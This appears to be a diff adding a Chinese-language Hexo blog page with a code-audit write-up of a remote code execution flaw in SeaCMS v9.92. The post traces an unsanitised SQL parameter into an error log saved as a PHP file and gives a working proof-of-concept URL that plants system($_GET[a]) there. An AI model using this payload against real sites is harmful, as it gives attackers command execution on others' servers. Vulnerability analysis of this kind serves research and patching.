@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Q1ngShan">
+    
+    <title>
+        
+            seacmsv9.92 前台Getshell |
+        
+        Q1ngShan&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Q1ngShan&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">seacmsv9.92 前台Getshell</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Q1ngShan</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2019-07-30 14:12:27</span>
+        <span class="mobile">2019-07-30 14:12</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>位置：<code>/comment/api/index.php</code><br><img src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/g4sm94sopu29axsjjfdg.png" alt="carbon -1-"></p>
+<p>首先在第三行引入了<code>common.php</code>文件<br><code>include/common.php</code>Line<code>98~118</code><br><img src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/f3wx6uznjfuo9r79g6o0.png" alt="carbon"><br>在这里对<code>GET、POST、Cookie</code>传入的参数进行注册<br>这里对后面漏洞的触发很重要吗，接着向下进行<br><img src="https://res.cloudinary.com/m4p1e/image/upload/v1564457277/blog/dwozqbfv5fqsdq8zipsj.png" alt="carbon -2-"></p>
+<p>第19行进入了<code>ReadData</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadData</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$type</span>,<span class="variable">$pCount</span>,<span class="variable">$rlist</span>;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$page</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="variable">$type</span>,<span class="variable">$id</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$id</span>&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="number">0</span>] = Readmlist(<span class="variable">$id</span>,<span class="variable">$page</span>,<span class="variable">$ret</span>[<span class="number">4</span>]);</span><br><span class="line">		<span class="variable">$ret</span>[<span class="number">3</span>] = <span class="variable">$pCount</span>;</span><br><span class="line">		<span class="variable">$x</span> = implode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$rlist</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$x</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="number">1</span>] = Readrlist(<span class="variable">$x</span>,<span class="number">1</span>,<span class="number">10000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="variable">$readData</span> = FormatJson(<span class="variable">$ret</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$readData</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>global $type,$pCount,$rlist;</code>这些参数都是通过前面提到过的注册而来的变量<br>重点在于<code>$rlist</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = implode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$rlist</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$x</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="number">1</span>] = Readrlist(<span class="variable">$x</span>,<span class="number">1</span>,<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>将<code>$list</code>数组转换为字符串，接着进入到了<code>Readrlist</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Readrlist</span>(<span class="params"><span class="variable">$ids</span>,<span class="variable">$page</span>,<span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$dsql</span>,<span class="variable">$type</span>;</span><br><span class="line">	<span class="variable">$rl</span>=<span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="subst">$type</span> AND id in (<span class="subst">$ids</span>) ORDER BY id DESC&quot;</span>;</span><br><span class="line">	<span class="variable">$dsql</span>-&gt;setQuery(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$dsql</span>-&gt;Execute(<span class="string">&#x27;commentrlist&#x27;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="variable">$dsql</span>-&gt;GetArray(<span class="string">&#x27;commentrlist&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$rl</span>[]=<span class="string">&quot;\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;\&quot;:&#123;\&quot;uid\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;uid&#x27;</span>].<span class="string">&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;</span>.(<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="number">1</span>:<span class="number">0</span>).<span class="string">&quot;,\&quot;from\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;dtime&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;reply&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;msg&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;agree\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;agree&#x27;</span>].<span class="string">&quot;,\&quot;aginst\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;anti&#x27;</span>].<span class="string">&quot;,\&quot;pic\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;pic&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;vote&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;</span>.(<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;anti&#x27;</span>])?<span class="number">0</span>:<span class="number">1</span>).<span class="string">&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;ischeck&#x27;</span>].<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$readrlist</span>=join(<span class="variable">$rl</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$readrlist</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到拼接入sql语句并执行了<code> AND id in ($ids)</code><br>接下来看下<code>Execute</code>函数<br>位置<code>include/sql.class.php</code> Line<code>224~257</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行一个带返回结果的SQL语句，如SELECT，SHOW等</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Execute</span>(<span class="params"><span class="variable">$id</span>=<span class="string">&quot;me&quot;</span>, <span class="variable">$sql</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line">	<span class="built_in">self</span>::<span class="variable">$i</span>++;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$dsql</span>-&gt;isClose)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Open(<span class="literal">false</span>);</span><br><span class="line">		<span class="variable">$dsql</span>-&gt;isClose = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$sql</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;SetQuery(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//SQL语句安全检查</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;safeCheck)</span><br><span class="line">	&#123;</span><br><span class="line">		CheckSql(<span class="keyword">$this</span>-&gt;queryString);</span><br><span class="line">	&#125;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$t1</span> = ExecTime();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">$this</span>-&gt;result[<span class="variable">$id</span>] = mysqli_query(<span class="keyword">$this</span>-&gt;linkID,<span class="keyword">$this</span>-&gt;queryString);</span><br><span class="line">	<span class="comment">//查询性能测试</span></span><br><span class="line">	<span class="comment">//$queryTime = ExecTime() - $t1;</span></span><br><span class="line">	<span class="comment">//if($queryTime &gt; 0.05) &#123;</span></span><br><span class="line">		<span class="comment">//echo $this-&gt;queryString.&quot;--&#123;$queryTime&#125;&lt;hr /&gt;\r\n&quot;; </span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;result[<span class="variable">$id</span>]===<span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;DisplayError(mysqli_error(<span class="keyword">$this</span>-&gt;linkID).<span class="string">&quot; &lt;br /&gt;Error sql: &lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="keyword">$this</span>-&gt;queryString.<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点在于255行的<code>DisplayError</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DisplayError</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$errorTrackFile</span> = dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../data/mysqli_error_trace.php&#x27;</span>;</span><br><span class="line">		<span class="comment">//if( file_exists(dirname(__FILE__).&#x27;/../data/mysqli_error_trace.php&#x27;) )</span></span><br><span class="line">		<span class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	@unlink(dirname(__FILE__).&#x27;/../data/mysqli_error_trace.php&#x27;);</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">		<span class="variable">$emsg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;&lt;h3&gt;seacms Error Warning!&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;&lt;a href=&#x27;http://www.seacms.net/ </span></span><br><span class="line"><span class="string">&#x27; target=&#x27;_blank&#x27; style=&#x27;color:red&#x27;&gt;Technical Support: http://www.seacms.net/&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div style=&#x27;line-helght:160%;font-size:14px;color:green&#x27;&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div style=&#x27;color:blue&#x27;&gt;&lt;br /&gt;Error page: &lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="keyword">$this</span>-&gt;GetCurUrl().<span class="string">&quot;&lt;/font&gt;&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;Error infos: <span class="subst">&#123;$msg&#125;</span>&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$emsg</span>;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$savemsg</span> = <span class="string">&#x27;Page: &#x27;</span>.<span class="keyword">$this</span>-&gt;GetCurUrl().<span class="string">&quot;\r\nError: &quot;</span>.<span class="variable">$msg</span>;</span><br><span class="line">		<span class="comment">//保存MySql错误日志</span></span><br><span class="line">		<span class="variable">$fp</span> = @fopen(<span class="variable">$errorTrackFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">		@fwrite(<span class="variable">$fp</span>, <span class="string">&quot;\r\n&lt;?php /*\r\n <span class="subst">&#123;$savemsg&#125;</span> \r\n*/  ?&gt;\r\n\r\n&quot;</span>);</span><br><span class="line">		@fclose(<span class="variable">$fp</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数首先输出了提示错误的html代码，之后将mysql的错误日志保存在了<code>data/mysqli_error_trace.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$savemsg</span> = <span class="string">&#x27;Page: &#x27;</span>.<span class="keyword">$this</span>-&gt;GetCurUrl().<span class="string">&quot;\r\nError: &quot;</span>.<span class="variable">$msg</span>;</span><br><span class="line">		<span class="comment">//保存MySql错误日志</span></span><br><span class="line">		<span class="variable">$fp</span> = @fopen(<span class="variable">$errorTrackFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">		@fwrite(<span class="variable">$fp</span>, <span class="string">&quot;\r\n&lt;?php /*\r\n <span class="subst">&#123;$savemsg&#125;</span> \r\n*/  ?&gt;\r\n\r\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>这里就触发了漏洞</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>这个漏洞的触发执行需要满足以下条件</p>
+<ol>
+<li>$page&gt;2</li>
+<li>$rlist不可为空</li>
+<li>触发sql错误</li>
+<li>闭合文件中的注释</li>
+</ol>
+<p>poc：<code>/comment/api/index.php?type=1&amp;gid=1&amp;page=3&amp;ran=123&amp;rlist[]=123%27*/system($_GET[a]);/*</code></p>
+<p><img src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/gpttrzajvme08g7rvdwz.jpg"><br><img src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/no8dixrus5s6ved2k7ni.jpg"><br>打开<code>data/mysqli_error_trace.php</code><br><img src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/cggq70wialtbfqhlchlu.jpg"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/09/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%B8%89%E2%80%94%E2%80%94Thinkphp%E6%A1%86%E6%9E%B6%E7%AF%87/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PHP代码审计入门篇三——Thinkphp框架篇</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/05/16/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%BA%8C-%E2%80%94%E2%80%94MVC%E7%BB%93%E6%9E%84%E5%AE%A1%E8%AE%A1/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PHP代码审计入门篇二 ——MVC结构审计</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Q1ngShan</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
